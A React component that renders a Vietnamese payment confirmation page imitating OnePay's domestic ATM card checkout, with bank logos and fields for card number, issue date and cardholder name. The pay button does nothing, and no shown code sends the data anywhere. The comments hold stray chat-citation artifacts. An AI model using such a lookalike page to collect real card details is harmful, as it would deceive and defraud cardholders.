import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';

const BANK_LOGOS: Record<string, string> = {
    'Vietcombank': 'https://upload.wikimedia.org/wikipedia/commons/e/e3/Vietcombank_logo_fixed.svg',       // :contentReference[oaicite:0]{index=0}
    'BIDV':       'https://upload.wikimedia.org/wikipedia/commons/6/69/Logo_BIDV.svg',                  // :contentReference[oaicite:1]{index=1}
    'VPBank':     'https://upload.wikimedia.org/wikipedia/commons/4/4e/VPBank_logo.svg',                // :contentReference[oaicite:2]{index=2}
    'Sacombank':  'https://upload.wikimedia.org/wikipedia/commons/2/2e/Logo-Sacombank-new.png',         // :contentReference[oaicite:3]{index=3}
    'VietinBank': 'https://upload.wikimedia.org/wikipedia/commons/3/36/Vietinbank.png',                 // :contentReference[oaicite:4]{index=4}
    // …các ngân hàng còn lại, bạn có thể tìm file tương ứng trên Wikimedia Commons hoặc trang brand assets chính thức của ngân hàng đó
  };
  

function useQuery() {
  return new URLSearchParams(useLocation().search);
}

const AtmDomesticConfirm = () => {
  const navigate = useNavigate();
  const query = useQuery();
  const bank = query.get('bank') || '';
  const [cardNumber, setCardNumber] = useState('');
  const [issue, setIssue] = useState('');
  const [owner, setOwner] = useState('');
  const [agree, setAgree] = useState(false);

  return (
    <div style={{ background: '#f7f7fa', minHeight: '100vh', width: '100vw', fontFamily: 'Montserrat, Arial, sans-serif', fontSize: 15 }}>
      {/* Header */}
      <div style={{ background: '#1976d2', color: '#fff', padding: '16px 0 12px 0', textAlign: 'left', position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'flex-start' }}>
        <button onClick={() => navigate(-1)} style={{ background: 'none', border: 'none', color: '#fff', fontSize: 22, fontWeight: 700, marginLeft: 12, cursor: 'pointer' }}>&#8592;</button>
        <div style={{ fontWeight: 700, fontSize: 18, flex: 1, textAlign: 'left', marginLeft: 8 }}>Xác nhận thanh toán</div>
      </div>
      {/* Logo + số tiền */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', margin: '18px 12px 0 12px' }}>
        
        
      </div>
      {/* ATM form */}
      <div style={{ background: '#fff', borderRadius: 12, margin: '18px 12px 0 12px', padding: '18px 16px', boxShadow: '0 2px 8px #0001' }}>
        <div style={{ fontWeight: 700, fontSize: 18, color: '#222', marginBottom: 8 }}>Thẻ ATM / Tài khoản ngân hàng <span style={{ border: '1.5px solid #1976d2', color: '#1976d2', borderRadius: 4, fontWeight: 700, fontSize: 13, padding: '1px 8px', marginLeft: 6 }}>ATM</span></div>
        <div style={{ fontWeight: 600, marginBottom: 8 }}>Thanh toán qua {bank} <img src={BANK_LOGOS[bank] || ''} alt={bank} style={{ height: 22, marginLeft: 8, verticalAlign: 'middle' }} /></div>
        <div style={{ marginBottom: 12 }}>
          <input value={cardNumber} onChange={e => setCardNumber(e.target.value)} placeholder="9704 1234 5678 9123 012" style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1.5px solid #bbb', fontSize: 16, marginBottom: 8, background: '#fff', color: '#222' }} />
          <input value={issue} onChange={e => setIssue(e.target.value)} placeholder="12/18" style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1.5px solid #bbb', fontSize: 16, marginBottom: 8, background: '#fff', color: '#222' }} />
          <input value={owner} onChange={e => setOwner(e.target.value)} placeholder="NGUYEN VAN A" style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1.5px solid #bbb', fontSize: 16, marginBottom: 8, background: '#fff', color: '#222' }} />
        </div>
        <div style={{ display: 'flex', alignItems: 'center', marginBottom: 10 }}>
          <input type="checkbox" checked={agree} onChange={e => setAgree(e.target.checked)} style={{ width: 18, height: 18, marginRight: 8 }} />
          <span style={{ fontSize: 15 }}>
            Tôi đã đọc, hiểu rõ và đồng ý với <a href="#" style={{ color: '#1976d2', textDecoration: 'underline' }}>Chính sách bảo vệ và xử lý dữ liệu cá nhân</a> của OnePay
          </span>
        </div>
        <div style={{ background: '#fffbe6', border: '1.5px solid #ffe082', borderRadius: 8, color: '#bfa100', fontSize: 15, padding: '10px 12px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 8 }}>
          <span style={{ fontSize: 18, marginTop: 2 }}>ⓘ</span>
          <span>Điều kiện thanh toán: Đăng ký dịch vụ VCB Digibank và số điện thoại nhận SMS-OTP cho thẻ ghi nợ nội địa {bank}.</span>
        </div>
        <div style={{ display: 'flex', gap: 18, marginTop: 8 }}>
          <a href="#" style={{ flex: 1, color: '#1976d2', fontWeight: 600, fontSize: 16, textAlign: 'center', textDecoration: 'underline', background: 'none', border: 'none', cursor: 'pointer', padding: '10px 0' }}>Hướng dẫn</a>
          <button disabled={!agree} style={{ flex: 1, background: agree ? '#1976d2' : '#e0e0e0', color: agree ? '#fff' : '#aaa', border: 'none', borderRadius: 6, padding: '10px 0', fontWeight: 700, fontSize: 17, cursor: agree ? 'pointer' : 'not-allowed' }}>Thanh toán</button>
        </div>
      </div>
      <div style={{ textAlign: 'center', margin: '24px 0 0 0' }}>
        <button onClick={() => navigate(-1)} style={{ color: '#e53935', background: 'none', border: 'none', fontWeight: 600, fontSize: 16, textDecoration: 'underline', cursor: 'pointer' }}>✗ Hủy giao dịch</button>
      </div>
    </div>
  );
};

export default AtmDomesticConfirm; 